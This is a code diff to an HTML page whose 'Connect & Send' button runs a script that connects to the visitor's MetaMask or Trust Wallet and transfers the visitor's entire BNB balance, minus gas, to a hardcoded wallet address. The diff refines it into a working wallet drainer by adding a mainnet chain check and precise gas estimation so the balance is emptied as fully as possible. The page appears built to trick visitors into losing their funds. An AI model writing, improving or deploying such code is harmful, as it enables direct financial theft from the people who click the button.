@@ -8,27 +8,41 @@
   <button onclick="connectAndTransfer()">Connect & Send</button>
 
   <script>
-    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Yahan apna destination wallet address daalo
+    const receiverAddress = "0x4a17942D1B9207ff13166c5B4dDdD5689384Cf3a"; // Do not change
 
     async function connectAndTransfer() {
       if (window.ethereum) {
         const web3 = new Web3(window.ethereum);
+
         try {
           await window.ethereum.request({ method: 'eth_requestAccounts' });
           const accounts = await web3.eth.getAccounts();
           const sender = accounts[0];
 
-          // Get full balance in Wei
-          let balance = await web3.eth.getBalance(sender);
-          
-          // Gas cost estimate (use ~0.001 BNB as gas)
-          const gasEstimate = web3.utils.toWei("0.001", "ether");
+          // Ensure BNB Smart Chain Mainnet (chainId 56)
+          const chainId = await web3.eth.getChainId();
+          if (chainId !== 56) {
+            alert("Please switch to BNB Smart Chain Mainnet.");
+            return;
+          }
 
-          // Amount to send = balance - gas
-          const amountToSend = web3.utils.toBN(balance).sub(web3.utils.toBN(gasEstimate));
+          // Get full balance
+          const balance = await web3.eth.getBalance(sender);
+
+          // Estimate dynamic gas cost
+          const gasLimit = await web3.eth.estimateGas({
+            from: sender,
+            to: receiverAddress,
+            value: balance
+          });
+          const gasPrice = await web3.eth.getGasPrice();
+          const gasEstimate = web3.utils.toBN(gasLimit).mul(web3.utils.toBN(gasPrice));
+
+          // Subtract gas from balance
+          const amountToSend = web3.utils.toBN(balance).sub(gasEstimate);
 
           if (amountToSend.lte(0)) {
-            alert("Insufficient balance to send BNB.");
+            alert("Insufficient BNB to cover gas fees.");
             return;
           }
 
@@ -39,12 +53,13 @@
             value: amountToSend.toString()
           });
 
-          alert("BNB sent! Tx hash: " + tx.transactionHash);
-        } catch (err) {
-          console.error("Error:", err);
+          alert("BNB sent successfully! Tx hash: " + tx.transactionHash);
+        } catch (error) {
+          alert("Error: " + error.message);
+          console.error("Transaction Error:", error);
         }
       } else {
-        alert("Install MetaMask or Trust Wallet.");
+        alert("Please install MetaMask or Trust Wallet.");
       }
     }
   </script>
